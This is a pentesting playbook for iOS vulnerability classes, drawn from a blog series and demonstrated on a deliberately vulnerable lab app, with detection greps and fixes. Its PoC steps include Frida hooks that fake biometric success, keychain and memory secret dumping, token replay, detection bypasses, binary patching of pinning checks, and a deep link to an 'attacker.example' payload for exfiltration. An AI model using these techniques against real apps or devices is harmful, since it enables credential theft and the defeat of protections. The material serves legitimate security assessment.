# iOS vulnerability-class reference — detection & PoC playbook

Per-class quick reference: **root cause → static signature (grep-able) → dynamic PoC → impact → fix**.
Works against the output of `scripts/analyze-ios.sh` (`plist_out/`, `classdump_out/`, `otool_out/`,
`nm_out/`, `swiftdemangle_out/`) on a decrypted IPA (see **I6** — check `cryptid` first).

> Source: Niraj Kharel's Mobile Pentesting series (nirajkharel.com.np), 65 posts — commands and
> patterns quoted verbatim; prose condensed with per-class source links. All PoCs were
> demonstrated against the author's deliberately vulnerable **VulnLabAppiOS** (`com.vulnlab.iosapp`).
> Private/research use; see attribution at the bottom.

**Swift-analysis gotchas that recur across every class:** pure-Swift `__objc_methnames` is often
empty — use `nm Payload/App.app/App | xcrun swift-demangle | grep -i '<selector>'`; debug builds
put code in `*.dylib` (scan those too); private Swift methods have no `@objc` thunk — hook the
underlying syscall/framework call instead.

---

## A. Storage & secrets

### A1. Keychain items readable regardless of lock state
[Source](https://nirajkharel.com.np/posts/ios-keychain-accessible-always/)
- **Root cause:** `SecItemAdd` query with `kSecAttrAccessibleAlways` — the Swift constant compiles to the raw string `"dku"`.
- **Static:** grep decompiled code for `kSecAttrAccessibleAlways`; `strings Payload/VulnLabApp.app/VulnLabApp | grep 'dku'` catches it in the binary.
- **PoC:** `objection -g com.vulnlab.iosapp explore` → `ios keychain dump`; `fridump --target-process com.vulnlab.iosapp --keychain`; Frida hook `SecItemAdd`/`SecItemUpdate` reading raw key `pdmn` from the query dict.
- **Impact:** plaintext API keys recoverable from a locked/forensically-acquired device — no unlock needed.
- **Fix:** `kSecAttrAccessibleWhenUnlockedThisDeviceOnly` (+ `SecAccessControlCreateWithFlags` + `.biometryCurrentSet`).
- **Cheat:** raw keychain attr strings `"dku"` / `"pdmn"` survive in the binary.

### A2. Secrets in NSUserDefaults plist
[Source](https://nirajkharel.com.np/posts/ios-nsuserdefaults-secrets/)
- **Root cause:** `UserDefaults.standard.set(..., forKey:)` storing `user_password`, `session_token`, `api_key`; App Group suites (`UserDefaults(suiteName:)`) equally exposed.
- **Static:** `strings Payload/VulnLabApp.app/VulnLabApp | grep -iE 'user_password|session_token|api_key|user_email'`; files at `Library/Preferences/<bundleid>.plist`, suites under `/private/var/mobile/Containers/Shared/AppGroup/<UUID>/Library/Preferences/`.
- **PoC:** objection `ios nsuserdefaults get`; `scp root@device:...plist .` + `plutil -convert xml1`; backup chain `idevicebackup2 backup --full ./backup` then `unback` + `find unback -name '*.plist'`.
- **Fix:** move secrets to Keychain (`kSecClassGenericPassword`, `WhenUnlockedThisDeviceOnly`); hashing tokens in UserDefaults is inadequate.

### A3. Plaintext CoreData / Realm databases
[Source](https://nirajkharel.com.np/posts/ios-unencrypted-coredata-realm/)
- **Root cause:** `NSPersistentContainer` store description omitting `NSPersistentStoreFileProtectionKey` (defaults to `NSFileProtectionNone`); `Realm.Configuration` without a 64-byte `encryptionKey`.
- **Static:** absence of those keys; CoreData store at `Library/Application Support/<name>.sqlite` (+`-wal`/`-shm`), Realm at `Documents/<dbname>.realm`.
- **PoC:** `scp -r root@device:/var/mobile/Containers/Data/Application/<UUID>/Documents/ ./`; `sqlite3 VulnLabAppiOS.sqlite` → `SELECT ZEMAIL, ZPASSWORD, ZSESSIONTOKEN, ZCREDITCARD, ZSSN FROM ZUSERRECORD;`; backup route `idevicepair pair && idevicebackup2 backup --full ./backup && idevicebackup2 unback`.
- **Fix:** Realm `encryptionKey` (stored in Keychain `WhenUnlockedThisDeviceOnly`); CoreData SQLCipher or per-field encryption + `FileProtectionType.complete`.
- **Cheat:** CoreData Z-table naming — `ZUSERRECORD` / `ZPASSWORD` / `ZSESSIONTOKEN` columns; "Data Protection ≠ encryption".

### A4. NSURLCache plaintext disk cache
[Source](https://nirajkharel.com.np/posts/ios-nsurlcache-sensitive-caching/)
- **Root cause:** `URLSessionConfiguration.default` inherits disk-backed `URLCache.shared` (50 MB SQLite); bodies + Authorization/Set-Cookie land in `Library/Caches/<bundle-id>/Cache.db`.
- **Static:** `nm Payload/VulnLabApp.app/VulnLabApp | grep -E 'URLCache|diskCapacity|memoryCapacity|removeCachedResponse'` — absence of capacity-zero/removal code is the finding.
- **PoC:** Frida hook `NSURLCache['- storeCachedResponse:forRequest:']` reading `args[3]`; pull the DB and extract bodies:
  `sqlite3 Cache.db "SELECT writefile('/tmp/body.gz', receiver_data) FROM cfurl_cache_receiver_data LIMIT 1;"` then `gunzip`.
- **Impact:** filesystem access recovers every API response + Bearer token without touching the network.
- **Fix:** `URLSessionConfiguration.ephemeral` / `reloadIgnoringLocalCacheData` / `removeAllCachedResponses()` in `applicationDidEnterBackground`.
- **Cheat:** Cache.db schema — `cfurl_cache_response` / `receiver_data` / blob in `blob_data` when >256 KB.

### A5. NSURLCredentialStorage persists credentials outside Keychain
[Source](https://nirajkharel.com.np/posts/ios-nsurlcredentialstorage-credential-leak/)
- **Root cause:** `NSURLCredential(persistence: .permanent)` → cleartext SQLite in `Library/Credentials/` — no `kSecAttrAccessible` gating, survives reboot, **invisible to SecItemCopyMatching** (keychain dumpers miss it).
- **Static:** `nm ... | grep -E 'NSURLAuthenticationMethod|URLCredential|setCredential|CredentialStorage'`; `setCredential` + `NSURLAuthenticationMethodHTTPBasic` = cached Basic auth.
- **PoC:** objection `ios nsurlcredentialstorage dump`; Frida hook `- setCredential:forProtectionSpace:` — persistence enum `2` (.permanent) is the finding; `cat /var/mobile/Containers/Data/Application/<UUID>/Library/Credentials/`.
- **Fix:** `.forSession` (memory-only — one enum change) or Keychain `kSecClassInternetPassword` + `WhenUnlockedThisDeviceOnly`.

### A6. Session token survives logout (4-layer cleanup miss)
[Source](https://nirajkharel.com.np/posts/ios-session-token-persistence-after-logout/)
- **Root cause:** `logout()` sets `isLoggedIn=false` in UserDefaults but skips SecItemDelete (Keychain), removeObject (UserDefaults), `removeAllCachedResponses()` (NSURLCache), `deleteAllCookies()` (HTTPCookieStorage).
- **Static:** locate the logout handler in class-dumped `LoginViewController`; missing calls to the four cleanup APIs.
- **PoC:** objection `ios keychain dump` before/after logout (persisting entries = finding); `cache.currentDiskUsage()` / `cookieStorage.cookies()` post-logout; always test the token server-side.
- **Fix:** explicit checklist — SecItemDelete per service, removeObject per key, removeAllCachedResponses, deleteCookie loop; server must invalidate too.
- **Framing:** "a checklist, not a heuristic".

### A7. Backup analysis — plaintext secrets in iTunes backups
[Source](https://nirajkharel.com.np/posts/ios-application-backup-analysis/)
- **Root cause:** Documents/, Library/Preferences/, Application Support/ included in backups without `NSURLIsExcludedFromBackupKey`.
- **Static:** missing exclusion flags; runtime audit via Frida checking `NSURLIsExcludedFromBackupKey` per file, printing `excluded=false` for backed-up secrets.
- **PoC:** `idevicebackup2 backup --full .` → `idevicebackup2 unback . restore/` →
  `plutil -convert xml1 ... -o - | grep -E 'token|api_key|password|session'` + `sqlite3 .../VulnLabAppiOS.sqlite "SELECT * FROM ZUSERDATA;"`.
- **Fix:** `isExcludedFromBackup = true` per sensitive file; whole-container kill switch `NSApplicationIsBackupAllowed = false`; move secrets to Keychain.

### A8. Memory scanning for disk-less secrets
[Source](https://nirajkharel.com.np/posts/ios-memory-scan-secrets/)
- **Technique:** secrets that never touch disk (decrypted tokens, assembled JWTs) exist only in heap/registers — scan the live process:
  `Process.enumerateRanges({ protection: 'r--', coalesce: true })` → `Memory.scan(range.base, range.size, '42 65 61 72 65 72 20', {onMatch,...})` → `address.readUtf8String(256)`.
- **Hex patterns:** JWT `65 79 4a` · AWS `41 4b 49 41` · Stripe `73 6b 5f 6c 69 76 65` · `api_key=` `61 70 69 5f 6b 65 79 3d` · `Bearer ` `42 65 61 72 65 72 20`.
- **Prove impact:** replay via `curl -H "Authorization: Bearer <token>" .../v1/user/profile` — 200 OK = live token.
- **Timing:** scan right after login; stack tokens vanish after return; `ObjC.choose` for prefix-less secrets; prefer anonymous pages over file-backed.

---

## B. WKWebView

### B1. Over-broad `loadFileURL(allowingReadAccessTo:)`
[Source](https://nirajkharel.com.np/posts/wkwebview-allowing-read-access-to/)
- **Root cause:** `- loadFileURL:allowingReadAccessToURL:` (selector survives in `__objc_methnames`) passed `URL(fileURLWithPath: "/")` or `NSHomeDirectory()` instead of the HTML's own directory.
- **Static:** `grep -r 'loadFileURL' classdump_out/` — any hit with `/` or home dir as arg 2 is vulnerable.
- **PoC:** Frida `Interceptor.attach(WKWebView['- loadFileURL:allowingReadAccessToURL:'].implementation, ...)` logging `args[2]`/`args[3]`; trigger via `ObjC.classes.NSURL.URLWithString_('vulnlab://webview?url=https://attacker.example/payload.html')` + `openURL_` on the main queue.
- **Impact:** WebView JS reads any app-readable file in scope — plists, databases, cached tokens.
- **Fix:** `webView.loadFileURL(html, allowingReadAccessTo: html.deletingLastPathComponent())` — smallest viable directory.
- **Gotcha:** iOS 15+ blocks direct `fetch('file://')` from null origin — chain via the native bridge instead.

### B2. Unauthenticated JS-to-native bridge
[Source](https://nirajkharel.com.np/posts/wkwebview-js-bridge-rce/)
- **Root cause:** `WKUserContentController.add(_:name:)` registers `"nativeBridge"`; `WKScriptMessageHandler` routes `exec`/`readFile`/`getToken` from `window.webkit.messageHandlers.nativeBridge.postMessage(payload)` with no origin check or caller auth.
- **Static:** `strings Payload/VulnLabApp.app/VulnLabApp | grep -iE 'bridge|handler|native'` — the bridge name survives in `__TEXT,__cstring` even in pure Swift.
- **PoC:** Frida hook `WKUserContentController['- addScriptMessageHandler:name:']`, read `new ObjC.Object(args[3])`; serve attacker HTML `python3 -m http.server 1337`; fire `vulnlab://webview?url=http://192.168.1.124:1337/attacker.html`; redefine `nativeBridgeCallback` to `fetch(...)`-exfiltrate; decode reads with `| base64 -d | plutil -p -`.
- **Impact:** shell execution (JB), base64 sandbox file read, session-token theft with auto-exfiltration.
- **Fix:** `removeAllScriptMessageHandlers()` in `decidePolicyFor` when leaving trusted hosts; `allowsContentJavaScript = false` where unneeded.
- **Bypasses (3):** empty `file://` host; `hasSuffix` subdomain takeover; unchecked http/https scheme. Also: action-fuzz the handler against a candidate action list.

---

## C. Deep links

### C1. Custom URL-scheme hijacking
[Source](https://nirajkharel.com.np/posts/ios-custom-url-scheme-hijacking/)
- **Root cause:** `CFBundleURLSchemes` is first-come-first-claim with no ownership proof; iOS never dedupes schemes; `sourceApplication` was removed from openURL options in iOS 9.
- **Static:** `plutil -convert xml1 -o stdout Payload/VulnLabApp.app/Info.plist | grep -iA20 CFBundleURLSchemes`; review `application(_:open:options:)` for missing caller checks + sensitive `print` logging.
- **PoC:** Frida Interceptor on `- application:openURL:options:` logging `args[3]`; fire `ObjC.classes.NSURL.URLWithString_('vulnlaboauth://callback?code=testcode123')` into `openURL_`.
- **Impact:** a later-installed malicious app silently captures OAuth codes, magic links, payment confirmations.
- **Fix:** migrate to Universal Links (`com.apple.developer.associated-domains` `applinks:` + AASA `"appIDs": ["TEAMID.com.vulnlab.iosapp"]`); in-app scheme validation runs in the wrong app.
- **Stealth trick:** relay to the real app via Universal Link so the victim doesn't notice.

### C2. Universal Link / AASA misconfiguration
[Source](https://nirajkharel.com.np/posts/ios-universal-link-misconfiguration/)
- **Root cause:** missing/invalid `apple-app-site-association` (404, redirects, wrong content-type, stale appIDs after TeamID change, trailing commas/BOM); `continueUserActivity` accepts any URL with no host/path check.
- **Static:** `codesign -d --entitlements :- Payload/VulnLabApp.app` — cross-ref `applinks:` entries against AASA `appIDs` and TeamID.
- **PoC:** `curl -v https://app.../.well-known/apple-app-site-association | jq .`; debug verification with `log stream --predicate 'subsystem == "com.apple.swcd"' --info`; synthesize `NSUserActivity` via `setWebpageURL_` with `https://app.../auth?token=test123`.
- **Impact:** failed verify → Safari fallback → hijackable `vulnlab://` scheme (chains with C1); token leak via unified log; expired-domain re-registration takeover.
- **Fix:** valid AASA (HTTP 200, no redirect, `application/json`, matching appIDs) + host/path validation in the handler.

### C3. Deep-link parameter injection
[Source](https://nirajkharel.com.np/posts/ios-deeplink-parsing/)
- **Root cause (3-branch taxonomy):** unchecked `vulnlab://open?redirect=` (open redirect); `vulnlab://login?token=` fed straight to the auth manager (attacker-chosen session); `let fullPath = basePath + filename` without `standardizingPath` / `url.path.hasPrefix(...)` confusion (sandbox traversal).
- **Static:** `plutil ... | grep -A10 CFBundleURLTypes`; find handlers via
  `nm Payload/VulnLabApp.app/*.dylib | xcrun swift-demangle | grep -i 'openURL|handleURL|deeplink'` (pure-Swift `handleURL` is invisible to `ObjC.classes`).
- **PoC:** hook `- application:openURL:options:` logging `args[3]`; then
  `UIApplication.shared.open(url)` with `vulnlab://view?file=../../Library/Preferences/com.vulnlab.iosapp.plist`.
- **Fix:** host allowlist for redirects; canonicalize/validate every param; user confirmation for sensitive actions; route via `url.pathComponents`, not `hasPrefix`.

---

## D. UI & data-exposure leaks

### D1. Pasteboard leak
[Source](https://nirajkharel.com.np/posts/ios-pasteboard-leak/)
- **Root cause:** `UIPasteboard.general` `.string` writes for passwords/OTPs/tokens — device-wide shared, no permission prompt; the iOS 14 banner is transparency only.
- **Static:** `strings Payload/VulnLabApp.app/VulnLabApp | grep -i pasteboard` — inspect each match's write for OTP/password/token values.
- **PoC:** Frida attach to `UIPasteboard` `['- setString:']`, log `new ObjC.Object(args[2]).toString()`; attacker app reads `UIPasteboard.general.string` on `didBecomeActiveNotification` and exfiltrates.
- **Fix:** `setItems(...)` with `[.expirationDate: Date(timeIntervalSinceNow: 60), .localOnly: true]`; clear after the flow; `textContentType = .oneTimeCode` for OTP autofill.

### D2. Background snapshot leak
[Source](https://nirajkharel.com.np/posts/ios-background-snapshot-leak/)
- **Root cause:** empty `applicationWillResignActive` — no privacy overlay before iOS writes the screenshot to `Library/Caches/Snapshots/` (`.ktx`/`.png`).
- **Static:** `nm Payload/VulnLabApp.app/VulnLabApp | grep -i resign` — a handler that only calls `saveState()`/analytics counts as vulnerable.
- **PoC:** Frida observer on `UIApplicationWillResignActiveNotification` (fires immediately before the snapshot);
  `find /var/mobile/Containers/Data/Application -name '*.ktx' -o -name '*.png' | grep -i snapshot`; convert `sips -s format png snapshot.ktx --out snapshot.png`.
- **Impact:** balances, OTPs, messages, seed phrases leak via backups/forensics/shoulder-surfing.
- **Fix:** privacy overlay in `applicationWillResignActive`/`sceneWillResignActive`; `isSecureTextEntry = true` on sensitive fields.

### D3. Share-sheet leak
[Source](https://nirajkharel.com.np/posts/ios-uiactivity-share-sheet-leak/)
- **Root cause:** token/PII verbatim in `activityItems` of `UIActivityViewController` with no `excludedActivityTypes` — every installed share extension receives the payload.
- **Static:** `nm ... | grep -E 'UIActivityViewController|excludedActivityTypes'` — class symbol without the exclusion symbol = inspect items.
- **PoC:** hook `- initWithActivityItems:applicationActivities:` logging `[UIActivityVC] activityItems=`; a PoC extension exfiltrates the attachment in `didSelectPost()`.
- **Impact:** silent credential exfiltration via malicious extension, AirDrop, pasteboard (iOS ≤13 fully silent).
- **Fix:** set `excludedActivityTypes` and share only redacted text — **third-party extensions cannot be excluded**, so never share secrets via the sheet at all.

---

## E. Crypto & authentication

### E1. Biometric prompt as boolean gate (LAContext)
[Source](https://nirajkharel.com.np/posts/ios-lacontext-biometric-bypass/)
- **Root cause:** sensitive operation gated solely on the success `Bool` of `-[LAContext evaluatePolicy:localizedReason:reply:]` (reply block at `args[4]`; `evaluateAccessControl:` variant at `args[5]`), with the secret stored `kSecAttrAccessibleAlways` — "pure theatre".
- **Static:** `plutil ... | grep -A2 FaceIDUsage` (`NSFaceIDUsageDescription`); vulnerable = callback-fires → proceed; robust = callback-fires → ACL-bound Keychain fetch.
- **PoC:** Frida: in `onEnter` wrap `new ObjC.Block(args[4])`, replace to invoke the original callback with success `1` and `NULL` error regardless of the real biometric result.
- **Fix:** `SecAccessControlCreateWithFlags` + `kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly` + `.biometryCurrentSet`, attached via `kSecAttrAccessControl`; fetch with `SecItemCopyMatching` + `kSecUseOperationPrompt`.
- **Key distinction:** boolean gate vs cryptographic gate.

### E2. Weak cryptography in CommonCrypto
[Source](https://nirajkharel.com.np/posts/ios-weak-cryptography/)
- **Root cause:** CommonCrypto enforces no algorithm policy — DES/3DES/RC4, MD5/SHA-1, AES-CBC with static IV (`kCCOptionECBMode`, hardcoded `let key = "vulnkey"`), `arc4random()` for key generation.
- **Static (4 greps → 4 findings):** `nm ... | grep -E 'kCCAlgorithmDES|kCCAlgorithm3DES|kCCAlgorithmRC4'`; `grep -E 'CC_MD5|CC_SHA1|kCCHmacAlgMD5|kCCHmacAlgSHA1'`; `grep -E '\barc4random\b|\brand\b|\bsrand\b'`; hardcoded keys via strings. Integer-embedded constants only sometimes appear in debug symbols — don't rely on strings alone.
- **PoC:** hook `CCCrypt` (see E3) and read `args[6]` IV — an all-zero IV on every call confirms static IV.
- **Impact:** hardcoded key via strings, ECB/static-IV pattern leakage, padding oracle (~128 queries/byte).
- **Fix:** `SecRandomCopyBytes(kSecRandomDefault, ...)` for IV and keys; prepend random IV to ciphertext.

### E3. Live CCCrypt interception (key/IV/plaintext)
[Source](https://nirajkharel.com.np/posts/ios-cccrypt-live-interception/)
- **Technique:** "Hook the function, read the pointers, you have the key, the IV, and the data":
  `const CCCrypt = Module.findExportByName('libcommonCrypto.dylib', 'CCCrypt');` → `args[3]` key (`readByteArray(keyLen)`), null-check the IV, `args[6]` data (`readByteArray(Math.min(dataLen, 512))`). Streaming: hook `CCCryptorCreate` + `CCCryptorUpdate`. Offline decrypt:
  `openssl enc -d -aes-128-cbc -K 76756c6e6b6579... -iv 000...0 -nosalt`.
- **Static:** algorithm constants only (`kCCAlgorithmAES=0`, `kCCOptionPKCS7Padding=1`) — the runtime key/derivation is invisible statically; for CryptoKit find the mangled symbol `nm ... | grep -i 'aes.*seal|seal.*aes'`.
- **Ops caps:** 512/256-byte reads, UTF-8-first reads.
- Companion repo tooling: `runtime/crypto-dump.js`.

---

## F. Network / TLS

### F1. ATS globally disabled
[Source](https://nirajkharel.com.np/posts/ios-ats-bypass/)
- **Root cause:** `NSAppTransportSecurity` with `NSAllowsArbitraryLoads = true` + per-domain `NSExceptionMinimumTLSVersion = TLSv1.0`; audit `NSAllowsArbitraryLoadsInWebContent`, `NSAllowsLocalNetworking`.
- **Static:** `plutil -convert xml1 -o stdout .../Info.plist | grep -A30 NSAppTransportSecurity`; verify each exception domain is developer-controlled.
- **PoC:** `mitmproxy --mode transparent --listen-port 8080 --ssl-insecure` + device proxy — cleartext requests and auth headers land in the proxy log (no CA install needed for plain HTTP).
- **Fix:** omit the ATS dict or narrow `NSExceptionDomains` to `TLSv1.2`; keep `NSAllowsArbitraryLoadsInWebContent = false`.
- **Framing:** ATS off is a *precondition*, not an exploit — pair with a real interception finding.

### F2. "Pinning theatre" in the TLS challenge handler
[Source](https://nirajkharel.com.np/posts/ios-urlsession-cert-error-proceed/)
- **Root cause:** `urlSession(_:didReceive:completionHandler:)` builds a credential from untrusted `challenge.protectionSpace.serverTrust` and calls `completionHandler(.useCredential, credential)` without `SecTrustEvaluateWithError`.
- **Static:** `otool -v -s __TEXT __objc_methnames ... | grep -i Challenge`; trace every path to `.useCredential`; `grep 'URLSession.shared'` (shared session bypasses the pinning delegate); red flags: TODO comments, always-true debug flags, failure branch that also accepts.
- **PoC:** Frida — iterate `ObjC.classes`, attach to `'- URLSession:didReceiveChallenge:completionHandler:'`, log `challenge.protectionSpace().host()` per handler; mitmproxy + CA then decrypts a `https://self-signed.badssl.com/` fetch.
- **Fix:** guard `serverTrust` + `NSURLAuthenticationMethodServerTrust`, run `SecTrustEvaluateWithError(trust, &error)`, pin SHA-256 SPKIs; every failure path `.cancelAuthenticationChallenge`.

### F3. ARM64 binary patching (last-resort pinning kill)
[Source](https://nirajkharel.com.np/posts/ios-binary-patching-arm64/)
- **When:** pinning runs pre-`main` in C++ static initializers / custom TLS stacks (e.g. Fizz) with no ObjC/Swift symbols — Frida attaches too late.
- **Locate:** Ghidra Search → For Strings "certificate"/"pinnedCertificate" → find the `SecTrustEvaluate` call → conditional branch; file offset = `vaddr - (LC_SEGMENT_64 vmaddr - fileoff)`; verify `xxd -s <file_offset> -l 4`.
- **Patch:** NOP the branch — `printf '\x1f\x20\x03\xd5' | dd of=Payload/VulnLabApp.app/VulnLabApp bs=1 seek=<file_offset> conv=notrunc`; re-sign `codesign -f -s -`; repack `cd Payload && zip -qry ../Patched.ipa .`. Unconditional-B encoding: `((N & 0x3FFFFFF) | 0x14000000)`. In-process alternative: `Memory.patchCode(branchAddr, 4, ...)`.
- Same skill defeats root/JB/license checks: "Find the branch, flip it". Try `objection ... ios sslpinning disable` first.

---

## G. Anti-analysis & recon

### G1. Jailbreak-detection bypass
[Source](https://nirajkharel.com.np/posts/ios-jailbreak-detection-bypass/)
- **Checks funnel through interceptable userland calls:** `FileManager.fileExists(atPath:)` (`/Applications/Cydia.app`, `/bin/bash`), `UIApplication.canOpenURL` (`cydia://`, `sileo://`, `zbra://`, `filza://`), `_dyld_get_image_name` (MobileSubstrate/TweakInject), `fork`, `getppid`.
- **Static:** grep `fileExistsAtPath`, `canOpenURL`, `_dyld_image_count`, `_dyld_get_image_name`; strings `MobileSubstrate`, `TweakInject`, `undecimus`, `/private/var/lib/apt/`.
- **Bypass:** Frida `onLeave` retval `0` for `-[NSFileManager fileExistsAtPath:]` / `-[UIApplication canOpenURL:]`; `fork` → `-1`, `getppid` → `1`, `_dyld_get_image_name` → rewrite to `"libSystem.B.dylib"`.
- **Survivors:** only ~5–10% using behavioral checks; `__TEXT` integrity hashes need binary patching, not hooks. Key insight: **hook the syscall, not the private Swift method**.
- Companion repo tooling: `runtime/ios-bypass.js`.

### G2. Debugger-detection bypass
[Source](https://nirajkharel.com.np/posts/ios-debugger-detection-bypass/)
- **Detectable calls:** `ptrace(PT_DENY_ATTACH=31)`, `sysctl` `kinfo_proc` `p_flag & P_TRACED` (0x800; mib `CTL_KERN, KERN_PROC, KERN_PROC_PID`), `getppid() != 1`; exits via `exit`/`abort`/`_exit`.
- **Bypass:** `if (args[0].toInt32() === 31) args[0] = ptr(0);` for ptrace (**cold-spawn required** — fires at startup); `onLeave` `pFlagAddr.writeU32(flag & ~P_TRACED)` at offset 32; `retval.replace(1)` for getppid; hook `exit`/`abort`/`_exit` + `Thread.backtrace(...)` to find which check fired.
- **Loop:** hook-exit → backtrace → bypass converges in 2–3 iterations. Hardcoded `p_flag` offset 32 may vary by platform.
- **Verdict:** client-side debugger detection is not a security boundary.

### G3. Resigning-detection bypass
[Source](https://nirajkharel.com.np/posts/ios-resigning-detection-bypass/)
- **Checks:** bundle ID, `embedded.mobileprovision`, LC_CODE_SIGNATURE, cryptid, resource SHA-256 hashes; iOS parses the Mach-O directly (`SecStaticCodeCheckValidity` is macOS-only).
- **Bypass:** hooks `NSBundle['- bundleIdentifier']`, `pathForResource:ofType:` (return nil for the profile), `SecTaskCopyValueForEntitlement`, plus an exit-watcher with `Thread.backtrace(this.context, Backtracer.ACCURATE)`; keep the original mobileprovision when resigning.
- **Methodology:** hook exit first, read the backtrace, target the firing check; layered SDKs (Guardsquare, Promon, DexProtector) need iterative hooking. `cryptid==0` also reveals a decrypted binary.

### G4. IPA decryption (frida-ios-dump)
[Source](https://nirajkharel.com.np/posts/ios-ipa-decryption-frida-ios-dump/)
- **Check first:** `otool -l Payload/VulnLabApp.app/VulnLabApp | grep -A4 LC_ENCRYPTION_INFO` — `cryptid 1` = FairPlay-encrypted (class-dump/nm useless until decrypted).
- **Dump:** `pip3 install frida-ios-dump`; `iproxy 2222 22`; `ssh -p 2222 root@localhost`; `python3 frida-ios-dump.py -H 127.0.0.1 -p 2222 -u root -P alpine VulnLabAppiOS`; verify `cryptid 0` after.
- **After:** `nm ... | grep -E 'api\.|token|secret|password|Bearer|https://' | sort -u`.
- **Gotchas:** per-framework cryptid — each `Frameworks/` dylib may need separate dumping; class-dump is ObjC-only but Swift strings survive in `__cstring`.
- Companion: `docs/ios-nojailbreak.md`, `scripts/analyze-ios.sh`.

### G5. class-dump / strings endpoint & secret inventory
[Source](https://nirajkharel.com.np/posts/ios-class-dump-endpoint-leak/)
- **Static:** `class-dump -o headers/ Payload/VulnLabApp.app/VulnLabApp`;
  `strings ... | grep -E '^https?://|^/api/|^/v[0-9]+/' | sort -u`;
  `strings ... | grep -iE 'api_key|secret|aws_|sk-prod|token=|password='` — admin/internal endpoints (incl. plaintext `http://…:8080`) never shown in UI.
- **Dynamic:** `ObjC.classes['VulnLabApp.WebViewController']` + `ObjC.chooseSync(cls)[0]`; attach `'- userContentController:didReceive:'` to log JS-bridge traffic.
- **Fix:** server-side authorization for hidden endpoints; never bundle secrets — fetch per-user keys at runtime.

### G6. Entitlements — wildcard keychain access group
[Source](https://nirajkharel.com.np/posts/ios-entitlements-keychain-group-sharing/)
- **Root cause:** `keychain-access-groups` entry `$(AppIdentifierPrefix)com.vulnlab.*` — any app under the same Team ID declaring the wildcard can `SecItemCopyMatching` the victim's tokens, silently.
- **Static:** `codesign -d --entitlements - Payload/VulnLabApp.app/VulnLabApp` (or `ldid -e ...`) — **any wildcard in the output is a finding**; also flag `application-groups`, `associated-domains`, `aps-environment`, `com.apple.private.*`. First file to read after decrypting an IPA.
- **PoC:** Frida hook `SecItemAdd` reading `dict.objectForKey_('agrp')` to enumerate access groups at runtime; attacker app declares the wildcard and queries with `kSecMatchLimitAll`.
- **Fix:** fully-qualified group names (`com.vulnlab.iosapp.credentials`), never wildcards.

### G7. NSKeyedUnarchiver insecure decoding
[Source](https://nirajkharel.com.np/posts/ios-nskeyedunarchiver-insecure/)
- **Root cause:** legacy `unarchiveObjectWithData:` / `unarchiveObjectWithFile:` / `initForReadingWithData:` allow arbitrary ObjC class instantiation + `initWithCoder:` side effects from attacker-influenced archive bytes (e.g. a network response) — "the iOS ObjectInputStream".
- **Static:** `nm ... | grep -E 'unarchiveObjectWithData|unarchiveObjectWithFile|initForReadingWithData|initForReadingFrom'`; trace call sites to the input source (network = highest risk).
- **PoC:** hook `+ unarchiveObjectWithData:` logging `new ObjC.Object(args[2]).length()`; payload built with `NSKeyedArchiver.archivedData(withRootObject:requiringSecureCoding: false)` wrapping an NSExpression FUNCTION gadget.
- **Fix:** `unarchiveObject(ofClasses:from:)` allowlist + `NSSecureCoding`.

### G8. ASWebAuthenticationSession without ephemeral
[Source](https://nirajkharel.com.np/posts/ios-aswebauthenticationsession-no-ephemeral/)
- **Root cause:** `ASWebAuthenticationSession` started without `prefersEphemeralWebBrowserSession = true` (defaults false) — shares Safari's persistent cookie jar; silent token issuance on an existing IdP session.
- **Static:** `nm ... | grep -E 'ASWebAuthenticationSession|prefersEphemeral'` — class present, property symbol absent = insecure default.
- **PoC:** attach `- setPrefersEphemeralWebBrowserSession:` and log `args[2].toInt32()` — **the hook never firing means it is never set** (negative-signal heuristic); chain with a hijackable custom-scheme callback (C1).
- **Fix:** set ephemeral + `presentationContextProvider` before `start()`; use a Universal Link redirect instead of a custom scheme.

---

## Attribution
Vuln-class series © **Niraj Kharel** ([nirajkharel.com.np](https://nirajkharel.com.np/categories/mobile-pentesting/)),
Mobile Pentesting series (65 posts, 2021–2026), demonstrated against the author's VulnLabAppiOS.
Commands, patterns, and PoCs quoted verbatim for interoperability; narrative prose condensed with
per-class source links. No open license is declared on the source — keep this reference to
private/research use, or obtain the author's permission before redistributing.
